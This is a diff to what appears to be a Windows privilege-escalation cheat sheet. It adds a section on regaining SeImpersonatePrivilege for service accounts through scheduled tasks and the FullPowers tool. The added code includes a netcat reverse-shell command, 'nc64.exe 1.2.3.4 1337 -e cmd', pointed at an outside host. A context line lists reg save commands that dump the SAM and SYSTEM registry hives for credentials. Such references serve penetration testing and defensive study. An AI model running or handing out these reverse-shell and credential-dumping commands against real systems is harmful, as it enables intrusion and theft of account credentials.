@@ -613,7 +613,6 @@ Check for the following access tokens
 |SeTakeOwnership|Admin||
 |SeTcb|Admin||
 
-- SeAssignPrimaryTokenPrivilege
 - SeBackupPrivilege:
   - reg save HKLM\SAM sam.hive
   - reg save HKLM\SYSTEM system.hive
@@ -666,6 +665,28 @@ or diskshadow: <https://youtu.be/ur2HPyuQlEU?t=1121>
 For more information on those techniques:
 
 - [T1003.002 - OS Credential Dumping: Security Account Manager](https://attack.mitre.org/techniques/T1003/002/)
+
+#### Task Scheduler
+
+First, let's have a look at the following [Microsoft Security Hardening feature](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-security-hardening) for scheduled tasks
+
+> *If RequiredPrivileges is not present in the task definition, the default privileges of task principal account without the SeImpersonatePrivilege will be used for task process. If ProcessTokenSidType is not present in the task definition, “unrestricted” is used as the default.*
+
+On Windows, some services executed as *LOCAL SERVICE* or *NETWORK SERVICE* are configured to run with a restricted set of privileges.
+However, within the Register-ScheduledTask cmdlet, we can perform some token manipulation in order to get the **SeImpersonatePrivilege**
+
+We need to pass the "-RequiredPrivilege" to the Register-ScheduledTask cmdlet in order to go around that
+
+[FullPowers](https://github.com/itm4n/FullPowers) is a tool that allows us to automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and SeImpersonate.
+
+```bash
+# Simple recovery
+FullPowers
+# Specify a custom command line
+FullPowers -c "powershell -ep Bypass"
+# Start a netcat reverse shell and exit
+FullPowers -c "C:\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
 
 #### AlwaysInstallElevated
 
